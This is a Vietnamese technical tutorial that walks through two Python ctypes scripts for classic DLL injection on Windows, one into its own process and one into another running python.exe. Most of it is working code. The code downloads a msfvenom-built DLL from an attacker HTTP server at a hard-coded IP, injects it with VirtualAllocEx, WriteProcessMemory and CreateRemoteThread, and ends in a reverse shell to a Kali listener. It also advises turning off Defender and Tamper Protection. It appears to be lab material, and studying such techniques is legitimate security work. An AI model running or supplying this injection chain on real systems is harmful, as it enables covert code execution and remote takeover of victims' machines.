# Tài liệu kỹ thuật: Classic DLL Injection bằng Python

---

# #1 — Classic DLL Injection 

**File:** `classic_dll_injection.py`

## 1.1. Mô tả tổng quan

File này thực hiện kỹ thuật Classic DLL Injection theo phương pháp **Self-Injection** — tiêm DLL vào chính tiến trình Python đang chạy. Thay vì can thiệp vào tiến trình bên ngoài, chương trình sử dụng `GetCurrentProcess()` để lấy pseudo-handle của chính nó, sau đó thực hiện đầy đủ 4 bước injection chuẩn.

Phương pháp này bỏ qua toàn bộ cơ chế bảo vệ cross-process của Windows (AV hook, Integrity Level, Process Mitigation Policy), nên **luôn thành công** mà không cần quyền Administrator hay tắt Windows Defender.

## 1.2. Giải thích code chi tiết

### Import và hằng số (dòng 1–10)

```python
import os
import sys
import ctypes
from ctypes import wintypes
import urllib.request
```

- `ctypes`: Thư viện chuẩn Python cho phép gọi trực tiếp các hàm C trong DLL hệ thống Windows (kernel32.dll, user32.dll, ntdll.dll...) mà không cần viết extension bằng C/C++.
- `wintypes`: Module con của ctypes, cung cấp sẵn các kiểu dữ liệu Windows như `HANDLE`, `DWORD`, `BOOL`, `HMODULE` tương ứng với các kiểu trong Windows SDK.
- `urllib.request`: Module tải file qua HTTP để download DLL payload từ máy chủ tấn công (Kali Linux).

```python
MEM_COMMIT  = 0x00001000
MEM_RESERVE = 0x00002000
PAGE_READWRITE = 0x04
```

| Hằng số | Giá trị | Ý nghĩa |
|---|---|---|
| `MEM_COMMIT` | `0x1000` | Yêu cầu hệ điều hành cấp phát bộ nhớ vật lý (RAM) cho vùng địa chỉ ảo đã đặt trước |
| `MEM_RESERVE` | `0x2000` | Đặt trước (reserve) một dải địa chỉ trong không gian bộ nhớ ảo của tiến trình |
| `PAGE_READWRITE` | `0x04` | Vùng nhớ có quyền Đọc + Ghi. Không cần Execute vì chỉ lưu chuỗi đường dẫn |

Khi kết hợp `MEM_COMMIT | MEM_RESERVE = 0x3000`, hệ điều hành vừa đặt trước vùng địa chỉ vừa cam kết cấp phát bộ nhớ vật lý ngay lập tức trong một lời gọi duy nhất.

### Khởi tạo kernel32 (dòng 13)

```python
kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
```

Tạo một đối tượng Python đại diện cho thư viện `kernel32.dll` của Windows. Tham số `use_last_error=True` kích hoạt cơ chế bảo vệ mã lỗi: sau mỗi lời gọi API, Python tự động sao chép giá trị `GetLastError()` vào vùng nhớ thread-local riêng biệt trước khi bất kỳ code Python nào khác có cơ hội ghi đè. Mã lỗi an toàn này được lấy bằng `ctypes.get_last_error()`.

### Khai báo prototype các hàm API (dòng 15–47)

Mỗi hàm Windows API cần khai báo 2 thuộc tính trước khi gọi:
- `restype`: Kiểu trả về (ví dụ: `HANDLE`, `BOOL`, `c_void_p`)
- `argtypes`: Danh sách kiểu của các tham số đầu vào

```python
# GetCurrentProcess — không có tham số, trả về HANDLE
kernel32.GetCurrentProcess.restype = wintypes.HANDLE
kernel32.GetCurrentProcess.argtypes = []

# VirtualAllocEx — 5 tham số
kernel32.VirtualAllocEx.restype = ctypes.c_void_p      # Trả về địa chỉ bộ nhớ
kernel32.VirtualAllocEx.argtypes = [
    wintypes.HANDLE,     # hProcess — handle tiến trình
    ctypes.c_void_p,     # lpAddress — địa chỉ bắt đầu (None = để OS chọn)
    ctypes.c_size_t,     # dwSize — kích thước cần cấp phát
    wintypes.DWORD,      # flAllocationType — MEM_COMMIT | MEM_RESERVE
    wintypes.DWORD       # flProtect — PAGE_READWRITE
]

# WriteProcessMemory — 5 tham số
kernel32.WriteProcessMemory.restype = wintypes.BOOL     # True/False
kernel32.WriteProcessMemory.argtypes = [
    wintypes.HANDLE,                  # hProcess
    ctypes.c_void_p,                  # lpBaseAddress — địa chỉ đích
    ctypes.c_void_p,                  # lpBuffer — dữ liệu nguồn
    ctypes.c_size_t,                  # nSize — số byte cần ghi
    ctypes.POINTER(ctypes.c_size_t)   # lpNumberOfBytesWritten — con trỏ nhận kết quả
]

# GetModuleHandleA — tìm module đã nạp
kernel32.GetModuleHandleA.restype = wintypes.HMODULE
kernel32.GetModuleHandleA.argtypes = [wintypes.LPCSTR]  # Tên module (byte string)

# GetProcAddress — tìm địa chỉ hàm trong module
kernel32.GetProcAddress.restype = ctypes.c_void_p       # Địa chỉ hàm
kernel32.GetProcAddress.argtypes = [wintypes.HMODULE, wintypes.LPCSTR]

# CreateRemoteThread — tạo luồng mới
kernel32.CreateRemoteThread.restype = wintypes.HANDLE
kernel32.CreateRemoteThread.argtypes = [
    wintypes.HANDLE,                  # hProcess
    ctypes.c_void_p,                  # lpThreadAttributes (NULL)
    ctypes.c_size_t,                  # dwStackSize (0 = mặc định)
    ctypes.c_void_p,                  # lpStartAddress — hàm sẽ thực thi
    ctypes.c_void_p,                  # lpParameter — tham số truyền cho hàm
    wintypes.DWORD,                   # dwCreationFlags (0 = chạy ngay)
    ctypes.POINTER(wintypes.DWORD)    # lpThreadId — nhận Thread ID
]

# WaitForSingleObject — chờ luồng hoàn tất
kernel32.WaitForSingleObject.restype = wintypes.DWORD
kernel32.WaitForSingleObject.argtypes = [wintypes.HANDLE, wintypes.DWORD]

# CloseHandle — giải phóng handle
kernel32.CloseHandle.restype = wintypes.BOOL
kernel32.CloseHandle.argtypes = [wintypes.HANDLE]
```

### Luồng thực thi chính — 4 bước (dòng 49–89)

**Bước 1 — Lấy handle tiến trình hiện tại:**
```python
hProcess = kernel32.GetCurrentProcess()
```

`GetCurrentProcess()` trả về **pseudo-handle** có giá trị `-1` (tương đương `0xFFFFFFFFFFFFFFFF` trên 64-bit). Đây không phải handle thật mà là giá trị đặc biệt: mỗi khi Windows kernel nhận được giá trị `-1` làm handle tiến trình, nó tự động ánh xạ về tiến trình đang gọi. Pseudo-handle luôn có đầy đủ quyền `PROCESS_ALL_ACCESS` mà không cần kiểm tra bảo mật, vì tiến trình đang tự thao tác trên chính mình.

**Tải DLL từ máy chủ:**
```python
url = "http://172.16.64.152/test.dll"
urllib.request.urlretrieve(url, "test.dll")
dll_path = os.path.abspath("test.dll")
dll_bytes = dll_path.encode('utf-8') + b'\x00'
```

- DLL payload (được tạo bằng `msfvenom`) nằm trên máy chủ HTTP (Kali Linux).
- `os.path.abspath()` chuyển đường dẫn tương đối thành đường dẫn tuyệt đối (VD: `C:\Users\...\test.dll`).
- `.encode('utf-8') + b'\x00'` chuyển chuỗi Python thành mảng byte **null-terminated** (kết thúc bằng `\x00`), vì hàm Windows API `LoadLibraryA` yêu cầu tham số kiểu LPCSTR — con trỏ đến chuỗi C kết thúc bằng ký tự null.

**Bước 2 — Cấp phát bộ nhớ:**
```python
addr = kernel32.VirtualAllocEx(
    hProcess, None, len(dll_bytes),
    MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE
)
```

Cấp phát một vùng nhớ có kích thước `len(dll_bytes)` byte (khoảng 46 byte) trong không gian địa chỉ ảo. Hàm trả về địa chỉ bắt đầu của vùng nhớ (VD: `0x1a2b3c40000`). Vùng nhớ này sẽ chứa chuỗi đường dẫn DLL.

**Bước 3 — Ghi đường dẫn DLL:**
```python
written = ctypes.c_size_t(0)
kernel32.WriteProcessMemory(
    hProcess, ctypes.c_void_p(addr),
    dll_bytes, len(dll_bytes),
    ctypes.byref(written)
)
```

Sao chép chuỗi byte `dll_bytes` (đường dẫn DLL) vào vùng nhớ tại địa chỉ `addr`. `ctypes.c_void_p(addr)` ép kiểu địa chỉ sang con trỏ void để đảm bảo tương thích 64-bit. Sau lệnh này, vùng nhớ tại `addr` chứa nội dung: `C:\Users\...\test.dll\x00`.

**Bước 4 — Tạo luồng thực thi LoadLibraryA:**
```python
h_kernel32 = kernel32.GetModuleHandleA(b"kernel32.dll")
load_lib_addr = kernel32.GetProcAddress(h_kernel32, b"LoadLibraryA")
```

- `GetModuleHandleA(b"kernel32.dll")`: Tìm handle (địa chỉ cơ sở nạp) của module `kernel32.dll`. Module này luôn được nạp sẵn trong mọi tiến trình Windows.
- `GetProcAddress(h_kernel32, b"LoadLibraryA")`: Tìm địa chỉ chính xác của hàm `LoadLibraryA` bên trong `kernel32.dll`. Đây là hàm Windows API dùng để nạp file DLL vào bộ nhớ tiến trình.

```python
thread_id = wintypes.DWORD(0)
hThread = kernel32.CreateRemoteThread(
    hProcess, None, 0,
    ctypes.c_void_p(load_lib_addr),   # ← Hàm mà luồng mới sẽ thực thi
    ctypes.c_void_p(addr),            # ← Tham số truyền cho hàm đó
    0, ctypes.byref(thread_id)
)
```

`CreateRemoteThread` tạo một luồng (thread) mới. Luồng này thực thi lệnh tương đương: `LoadLibraryA("C:\Users\...\test.dll")`. Khi `LoadLibraryA` được gọi, hệ điều hành sẽ nạp file DLL vào bộ nhớ và tự động chạy hàm `DllMain()` bên trong DLL đó. Nếu DLL là payload reverse shell, `DllMain` sẽ mở kết nối ngược (reverse connection) về máy chủ Kali.

## 1.3. Lưu đồ thực thi (Flow)

```
GetCurrentProcess()
        │
        ▼
  hProcess = -1 (pseudo-handle)
        │
        ▼
  urlretrieve() ──→ Tải test.dll từ HTTP server
        │
        ▼
  VirtualAllocEx(hProcess, ...) ──→ addr = 0x1a2b...
        │
        ▼
  WriteProcessMemory(hProcess, addr, "C:\...\test.dll\0")
        │
        ▼
  GetModuleHandleA("kernel32.dll") ──→ h_kernel32
  GetProcAddress(h_kernel32, "LoadLibraryA") ──→ load_lib_addr
        │
        ▼
  CreateRemoteThread(hProcess, load_lib_addr, addr)
        │
        ▼
  Luồng mới gọi: LoadLibraryA("C:\...\test.dll")
        │
        ▼
  Windows nạp DLL → DllMain() → Reverse Shell → Kali listener
```

## 1.4. Lưu ý kỹ thuật

1. **Pseudo-handle không cần `CloseHandle`**: Handle giá trị `-1` từ `GetCurrentProcess()` là pseudo-handle, không tiêu tốn tài nguyên kernel, nên không cần (và không nên) gọi `CloseHandle` cho nó.

2. **`PAGE_READWRITE` thay vì `PAGE_EXECUTE_READWRITE`**: Vùng nhớ chỉ chứa chuỗi đường dẫn (text data), không chứa mã máy (shellcode). Sử dụng quyền RWX (`0x40`) khi không cần thiết sẽ bị các hệ thống bảo mật đánh dấu là hành vi đáng ngờ.

3. **`use_last_error=True` bắt buộc**: Nếu không bật flag này, `kernel32.GetLastError()` có thể trả về mã lỗi của một lời gọi API nội bộ Python (chạy giữa lệnh API và lệnh GetLastError), dẫn đến debug sai hướng.

4. **Chuỗi null-terminated**: `+ b'\x00'` ở cuối `dll_bytes` là bắt buộc. Hàm `LoadLibraryA` (API ngôn ngữ C) đọc chuỗi cho đến khi gặp byte `\x00`. Nếu thiếu, hàm sẽ đọc tràn vùng nhớ và có thể crash.

---

# #2 — DLL Injection 

**File:** `dll_injection.py`

## 2.1. Mô tả tổng quan

File này thực hiện kỹ thuật Classic DLL Injection theo phương pháp **Cross-Process** — tiêm DLL vào một tiến trình khác đang chạy trên hệ thống. Chương trình sử dụng `CreateToolhelp32Snapshot` để duyệt danh sách tiến trình, tìm PID theo tên, sau đó mở tiến trình đó bằng `OpenProcess` và thực hiện 4 bước injection.

Phương pháp này yêu cầu:
- Quyền **Administrator** (để gọi `OpenProcess` với quyền đầy đủ)
- **Tắt Windows Defender** + **Tamper Protection** (để tránh bị hook chặn)
- Injector và target phải **cùng kiến trúc** 64-bit hoặc 32-bit

## 2.2. Giải thích code chi tiết

### Hằng số bổ sung (dòng 8–12)

```python
PROCESS_ALL_ACCESS = 0x001FFFFF
TH32CS_SNAPPROCESS = 0x00000002
```

| Hằng số | Giá trị | Ý nghĩa |
|---|---|---|
| `PROCESS_ALL_ACCESS` | `0x1FFFFF` | Tổ hợp TẤT CẢ các quyền truy cập tiến trình: đọc/ghi bộ nhớ, tạo luồng, truy vấn thông tin, kết thúc tiến trình |
| `TH32CS_SNAPPROCESS` | `0x02` | Cờ truyền vào `CreateToolhelp32Snapshot` để yêu cầu chụp danh sách tiến trình |

### Cấu trúc PROCESSENTRY32W (dòng 15–27)

```python
class PROCESSENTRY32W(ctypes.Structure):
    _fields_ = [
        ("dwSize", wintypes.DWORD),             # Kích thước struct (BẮT BUỘC gán trước khi gọi)
        ("cntUsage", wintypes.DWORD),            # Không sử dụng (luôn = 0)
        ("th32ProcessID", wintypes.DWORD),       # PID của tiến trình
        ("th32DefaultHeapID", ctypes.c_void_p),  # Heap ID mặc định
        ("th32ModuleID", wintypes.DWORD),        # Module ID (không sử dụng)
        ("cntThreads", wintypes.DWORD),          # Số luồng đang chạy
        ("th32ParentProcessID", wintypes.DWORD), # PID tiến trình cha
        ("pcPriClassBase", wintypes.LONG),       # Độ ưu tiên cơ sở
        ("dwFlags", wintypes.DWORD),             # Không sử dụng
        ("szExeFile", wintypes.WCHAR * 260),     # Tên file .exe (Unicode, MAX_PATH = 260)
    ]
```

Đây là ánh xạ 1:1 cấu trúc C `PROCESSENTRY32W` từ Windows SDK sang Python. Trường `dwSize` **bắt buộc phải được gán** giá trị `ctypes.sizeof(PROCESSENTRY32W)` trước khi truyền vào `Process32FirstW`/`Process32NextW`, nếu không hai hàm này sẽ trả về `False` và không có kết quả.

### Khởi tạo kernel32 (dòng 30)

```python
kernel32 = ctypes.windll.kernel32
```

Sử dụng `ctypes.windll` (singleton toàn cục) thay vì `ctypes.WinDLL`. Lý do: trong phiên bản cross-process, hàm `CreateRemoteThread` **không khai báo `argtypes`** — các tham số được bọc thủ công bằng ctypes objects. `ctypes.windll` đơn giản hơn, gọi thẳng hàm C mà không tạo thêm layer wrapper như `use_last_error`, tránh xung đột kiểu khi không có argtypes.

### Khai báo API (dòng 32–63)

Tương tự file #1 nhưng có sự khác biệt quan trọng:

**API dành riêng cho cross-process:**

```python
# OpenProcess — mở kênh giao tiếp đến tiến trình khác
kernel32.OpenProcess.restype = ctypes.c_void_p     # Handle tiến trình đích
kernel32.OpenProcess.argtypes = [
    wintypes.DWORD,   # dwDesiredAccess — quyền truy cập (PROCESS_ALL_ACCESS)
    wintypes.BOOL,    # bInheritHandle — handle có kế thừa không (False)
    wintypes.DWORD    # dwProcessId — PID tiến trình đích
]
```

**API liệt kê tiến trình:**

```python
# CreateToolhelp32Snapshot — chụp ảnh danh sách tiến trình
kernel32.CreateToolhelp32Snapshot.restype = ctypes.c_void_p
kernel32.CreateToolhelp32Snapshot.argtypes = [wintypes.DWORD, wintypes.DWORD]

# Process32FirstW / Process32NextW — duyệt từng mục trong snapshot
kernel32.Process32FirstW.restype = wintypes.BOOL
kernel32.Process32FirstW.argtypes = [ctypes.c_void_p, ctypes.POINTER(PROCESSENTRY32W)]
```

**Điểm khác biệt quan trọng:** `CreateRemoteThread` **KHÔNG** khai báo `argtypes`. Lý do kỹ thuật: khi ctypes tự ép kiểu handle 64-bit qua cơ chế argtypes, giá trị handle đôi khi bị cắt ngắn (truncated), khiến Windows kernel nhận handle sai và trả về lỗi `ERROR_INVALID_HANDLE (6)`. Bỏ argtypes và truyền ctypes objects thủ công giải quyết triệt để vấn đề này.

### Hàm tìm PID `get_pid_by_name` (dòng 66–79)

```python
def get_pid_by_name(proc_name):
    # Bước A: Chụp snapshot danh sách tiến trình
    hSnap = kernel32.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)

    # Bước B: Khởi tạo cấu trúc, GÁN dwSize
    pe32 = PROCESSENTRY32W()
    pe32.dwSize = ctypes.sizeof(PROCESSENTRY32W)

    # Bước C: Đọc mục đầu tiên
    if kernel32.Process32FirstW(hSnap, ctypes.byref(pe32)):
        while True:
            # Bước D: So khớp tên file (case-insensitive)
            if pe32.szExeFile.lower() == proc_name.lower():
                pid = pe32.th32ProcessID
                kernel32.CloseHandle(hSnap)
                return pid
            # Bước E: Chuyển sang mục tiếp theo
            if not kernel32.Process32NextW(hSnap, ctypes.byref(pe32)):
                break
    kernel32.CloseHandle(hSnap)
    return 0
```

Hàm này hoạt động như một "trình quản lý tiến trình" thu nhỏ: chụp snapshot toàn bộ tiến trình đang chạy, duyệt tuần tự, so tên, trả về PID khớp đầu tiên. Nếu không tìm thấy, trả về 0.

### Luồng thực thi chính — 4 bước (dòng 82–129)

**Bước 1 — Tìm tiến trình mục tiêu (dòng 82–85):**
```python
target = "python.exe"
pid = get_pid_by_name(target)
if not pid:
    sys.exit(1)
```

Tìm PID của tiến trình `python.exe` (tiến trình mục tiêu chạy `target.py`).

**Bước 2 — Mở tiến trình và cấp phát bộ nhớ (dòng 94–101):**
```python
hProcess = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
addr = kernel32.VirtualAllocEx(hProcess, None, len(dll_bytes),
                                MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)
```

- `OpenProcess(PROCESS_ALL_ACCESS, False, pid)`: Mở kênh giao tiếp từ tiến trình injector đến tiến trình đích. `False` = handle không được kế thừa bởi tiến trình con. Yêu cầu injector chạy với quyền Admin và cùng Integrity Level.
- `VirtualAllocEx`: Cấp phát vùng nhớ **trong không gian địa chỉ của tiến trình ĐÍ** (khác với self-injection, cấp phát trong chính mình).

**Bước 3 — Ghi đường dẫn DLL (dòng 104–105):**
```python
kernel32.WriteProcessMemory(hProcess, addr, dll_bytes, len(dll_bytes), ctypes.byref(written))
```

Ghi chuỗi đường dẫn DLL **xuyên qua ranh giới tiến trình** vào vùng nhớ đã cấp phát bên trong tiến trình đích.

**Bước 4 — Tạo luồng từ xa (dòng 112–120):**
```python
hThread = kernel32.CreateRemoteThread(
    ctypes.c_void_p(hProcess),       # Handle — ÉP KIỂU THỦ CÔNG
    ctypes.c_void_p(0),              # NULL
    ctypes.c_size_t(0),              # Stack mặc định
    ctypes.c_void_p(load_lib),       # LoadLibraryA
    ctypes.c_void_p(addr),           # Đường dẫn DLL
    wintypes.DWORD(0),               # Chạy ngay
    ctypes.byref(thread_id)
)
```

**Điểm mấu chốt:** Mỗi tham số được bọc rõ ràng trong kiểu ctypes (`c_void_p`, `c_size_t`, `DWORD`). Đây là cách khắc phục lỗi `ERROR_INVALID_HANDLE (6)` — đảm bảo **địa chỉ 64-bit không bị cắt ngắn** khi ctypes truyền vào hàm C.

## 2.3. Lưu đồ thực thi (Flow)

```
CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS)
        │
        ▼
  Process32FirstW / Process32NextW
  ──→ Duyệt danh sách, so khớp tên "python.exe"
        │
        ▼
  pid = th32ProcessID (VD: 15678)
        │
        ▼
  urlretrieve() ──→ Tải test.dll từ HTTP server
        │
        ▼
  OpenProcess(PROCESS_ALL_ACCESS, pid) ──→ hProcess
        │
        ▼
  VirtualAllocEx(hProcess, ...) ──→ addr (trong bộ nhớ tiến trình ĐÍCH)
        │
        ▼
  WriteProcessMemory(hProcess, addr, "C:\...\test.dll\0")
        │
        ▼
  GetModuleHandleA("kernel32.dll") → GetProcAddress("LoadLibraryA")
        │
        ▼
  CreateRemoteThread(hProcess, LoadLibraryA, addr)
        │
        ▼
  Luồng MỚI trong tiến trình ĐÍCH gọi: LoadLibraryA("C:\...\test.dll")
        │
        ▼
  Windows nạp DLL vào tiến trình đích → DllMain() → Reverse Shell
```

## 2.4. Lưu ý kỹ thuật

1. **`dwSize` phải được gán trước khi gọi `Process32FirstW`**: Đây là yêu cầu bắt buộc của Windows API. Nếu không gán `pe32.dwSize = ctypes.sizeof(PROCESSENTRY32W)`, hàm sẽ trả về `False` và không có dữ liệu.

2. **Không khai báo `argtypes` cho `CreateRemoteThread`**: Đây là biện pháp khắc phục lỗi handle trên hệ thống 64-bit. Khi `argtypes` được set, ctypes tự ép kiểu Python `int` sang `c_void_p` qua logic nội bộ, có thể gây mất dữ liệu vùng bit cao. Truyền thủ công `ctypes.c_void_p(value)` bỏ qua bước ép kiểu ngầm này.

3. **`ctypes.windll` vs `ctypes.WinDLL`**: File này dùng `windll` (singleton chung) vì không cần `use_last_error`. Kết hợp `WinDLL(use_last_error=True)` với việc không khai báo argtypes có thể gây xung đột — layer `use_last_error` tạo wrapper bổ sung can thiệp vào luồng gọi hàm.

4. **Tiến trình mục tiêu phù hợp**: Không phải mọi tiến trình đều inject được. Các ứng dụng UWP (Notepad Win11), Protected Process, và tiến trình SYSTEM-level (`svchost.exe`) đều có cơ chế bảo vệ ngăn `CreateRemoteThread`. Nên chọn tiến trình Win32 thuần (VD: `python.exe`, `mspaint.exe`).

5. **`CloseHandle(hSnap)` là bắt buộc**: Snapshot chiếm bộ nhớ kernel. Nếu không giải phóng, sẽ gây rò rỉ handle (handle leak) — tích lũy qua nhiều lần chạy có thể làm cạn tài nguyên hệ thống.

6. **Phải tắt cả Tamper Protection**: Real-time Protection chỉ kiểm soát quét file. Tamper Protection mới là thành phần bảo vệ các **kernel-level hook** trên `CreateRemoteThread`, `WriteProcessMemory`. Nếu chỉ tắt Real-time mà không tắt Tamper, hook vẫn tồn tại → vẫn bị lỗi 6.
